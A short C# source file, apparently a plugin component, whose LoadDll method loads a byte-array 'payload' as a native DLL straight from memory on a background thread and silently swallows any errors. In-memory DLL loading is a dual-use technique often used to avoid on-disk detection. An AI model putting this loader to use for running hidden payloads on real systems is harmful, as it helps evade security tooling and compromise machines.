using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class NativeDll
    {
        internal static bool LoadDll(byte[] payload) 
        {
            /*Task.Run(() => 
            {
                DLLFromMemory dll = new DLLFromMemory(payload);
                dll.Dispose();
            });*/
            Thread thread = new Thread(() =>
            {
                try
                {
                    DLLFromMemory dll = new DLLFromMemory(payload);
                    dll.Dispose();
                }
                catch {}
            });
            thread.Start();

            if (thread.IsAlive)
                return true;
            return false;
        }
    }
}
